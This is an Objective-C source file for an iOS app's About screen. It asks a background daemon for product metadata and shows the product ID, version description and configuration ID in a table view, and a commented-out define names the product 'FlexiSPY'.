//
//  About.m
//  PP
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "About.h"
#import "PPAppDelegate.h"

#import "AppEngineUICmd.h"
#import "ProductMetaData.h"
#import "ConfigurationID.h"

@implementation AboutSection

@synthesize mSectionName, mSectionRows;

-(id)initWithName:(NSString*) aName
{
	self = [super init];
	if(self){
		[self setMSectionName:aName];
	}
	return self;
}

-(void)addRow:(NSString*) aRowItem{
	if(mSectionRows == nil){
		mSectionRows = [[NSMutableArray alloc]init];
	}
	[mSectionRows addObject:aRowItem];
}

-(void)dealloc{
	[mSectionName release];
	[mSectionRows release];
	[super dealloc];
}

@end


@implementation About

@synthesize mTableView, mSections;
// The designated initializer.  Override if you create the controller programmatically and want to perform customization that is not appropriate for viewDidLoad.
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    if (self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil]) {
        // Custom initialization
    }
    return self;
}

//#define FS_VERSION @"1.0"
//#define FS_CONFIGURATION @"6"
//#define FS_PRODUCT @"FlexiSPY"
//#define FS_VERSION_LAB @"Version"
//#define FS_CONFIGURATION_LAB @"Configurations"
//#define FS_PRODUCT_LAB @"Product"


// Implement viewDidLoad to do additional setup after loading the view, typically from a nib.
- (void)viewDidLoad {
    [super viewDidLoad];
	DLog(@"-->Enter<--")
	
	mSections = [[NSMutableArray alloc] init];
//	if(mSections){
//		AboutSection* abSec = [[AboutSection alloc] init];
//		if(abSec){
//			abSec.mSectionName = FS_PRODUCT_LAB;
//			[abSec addRow: FS_PRODUCT];
//			[mSections addObject:abSec];
//			[abSec release];
//		}
//		
//		abSec = [[AboutSection alloc] init];
//		if(abSec){
//			abSec.mSectionName = FS_VERSION_LAB;
//			[abSec addRow: FS_VERSION];
//			[mSections addObject:abSec];
//			[abSec release];
//		}
//		
//		abSec = [[AboutSection alloc] init];
//		if(abSec){
//			abSec.mSectionName = FS_CONFIGURATION_LAB;
//			[abSec addRow: FS_CONFIGURATION];
//			[mSections addObject:abSec];
//			[abSec release];
//		}
//	}
	
	[mTableView setDelegate:self];
	[mTableView setDataSource:self];
	
	// Request aboout from daemon
	PPAppDelegate *appDelegate = (PPAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] addCommandDelegate:self];
	[[appDelegate mAppUIConnection] processCommand:kAppUI2EngineGetAboutCmd withCmdData:nil];
	DLog(@"viewDidLoad")
}

- (void)viewWillDisappear: (BOOL) animated {
	DLog(@"----->Enter<-----")
	PPAppDelegate *appDelegate = (PPAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] removeCommandDelegate:self];
}

/*
// Override to allow orientations other than the default portrait orientation.
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    // Return YES for supported orientations
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}
*/

- (void)didReceiveMemoryWarning {
	// Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];
	
	// Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
	// Release any retained subviews of the main view.
	// e.g. self.myOutlet = nil;
}

- (void) commandCompleted: (id) aCmdResponse toCommand: (NSInteger) aCmd {
	DLog(@"aCmd: %d", aCmd)
	if (aCmd == kAppUI2EngineGetAboutCmd) {
		NSData *data = aCmdResponse;
		DLog(@"data: %@", data)
		
		ProductMetaData *metaData = [[ProductMetaData alloc] initWithData:data];
		DLog(@"Config ID: %d", [metaData mConfigID])
		DLog(@"Product ID: %d", [metaData mProductID])
		DLog(@"Product version: %@", [metaData mProductVersion])
		DLog(@"Product version description: %@", [metaData mProductVersionDescription])
		
		AboutSection *abSec = [[AboutSection alloc] init];
		[abSec setMSectionName:NSLocalizedString(@"kProduct", @"")];
		[abSec addRow:[NSString stringWithFormat:@"%d", [metaData mProductID]]];
		[mSections addObject:abSec];
		[abSec release];
		
		abSec = [[AboutSection alloc] init];
		[abSec setMSectionName:NSLocalizedString(@"kVersion", @"")];
		NSString *replaceString = NSLocalizedString(@"kUnknownTitle", @"");
		if ([metaData mConfigID] == CONFIG_EXTREME_ADVANCED) {
			replaceString = NSLocalizedString(@"kOMNITitle", @"");
		} else if ([metaData mConfigID] == CONFIG_PREMIUM_BASIC) {
			replaceString = NSLocalizedString(@"kLIGHTTitle", @"");
		}
		NSString *des1 = [[metaData mProductVersionDescription] stringByReplacingOccurrencesOfString:NSLocalizedString(@"kUnknownTitle", @"")
																						  withString:replaceString];
		[abSec addRow:des1];
		[mSections addObject:abSec];
		[abSec release];
		
		abSec = [[AboutSection alloc] init];
		[abSec setMSectionName:NSLocalizedString(@"kConfiguration", @"")];
		[abSec addRow:[NSString stringWithFormat:@"%d", [metaData mConfigID]]];
		[mSections addObject:abSec];
		[abSec release];
		
		[mTableView reloadData];
		[metaData release];
	}
}

- (void)dealloc {
	[mSections release];
    [super dealloc];
}

#pragma mark Table view methods

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
	return [mSections count];
}


// Customize the number of rows in the table view.
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
	AboutSection* sect = [mSections objectAtIndex:section];
    return [sect.mSectionRows count];
}


// Customize the appearance of table view cells.
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    
    static NSString *CellIdentifier = @"Cell";
	
    UITableViewCell *cell = (UITableViewCell*) [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {		
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
	}

	AboutSection* aboutSect =  [mSections objectAtIndex:[indexPath section]];
	
	NSString* text = [aboutSect.mSectionRows objectAtIndex:[indexPath row]];
	cell.textLabel.text = text;
	
    return cell;
}

- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
	
	AboutSection* aboutSect =  [mSections objectAtIndex:section];
	return aboutSect.mSectionName;
}

- (void)viewWillAppear:(BOOL)animated {
	DLog(@"view appeared");
	[super viewWillAppear:animated];
	[self.view setHidden:NO];
}

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    return 50; //[indexPath row]; // your dynamic height...
}

// Override to support row selection in the table view.
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
	
    // Navigation logic may go here -- for example, create and push another view controller.
	// AnotherViewController *anotherViewController = [[AnotherViewController alloc] initWithNibName:@"AnotherView" bundle:nil];
	// [self.navigationController pushViewController:anotherViewController animated:YES];
	// [anotherViewController release];
	
}



/*
 // Override to support conditional editing of the table view.
 - (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath {
 // Return NO if you do not want the specified item to be editable.
 return YES;
 }
 */


/*
 // Override to support editing the table view.
 - (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath {
 
 if (editingStyle == UITableViewCellEditingStyleDelete) {
 // Delete the row from the data source.
 [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
 }   
 else if (editingStyle == UITableViewCellEditingStyleInsert) {
 // Create a new instance of the appropriate class, insert it into the array, and add a new row to the table view.
 }   
 }
 */


/*
 // Override to support rearranging the table view.
 - (void)tableView:(UITableView *)tableView moveRowAtIndexPath:(NSIndexPath *)fromIndexPath toIndexPath:(NSIndexPath *)toIndexPath {
 }
 */


/*
 // Override to support conditional rearranging of the table view.
 - (BOOL)tableView:(UITableView *)tableView canMoveRowAtIndexPath:(NSIndexPath *)indexPath {
 // Return NO if you do not want the item to be re-orderable.
 return YES;
 }
 */


@end
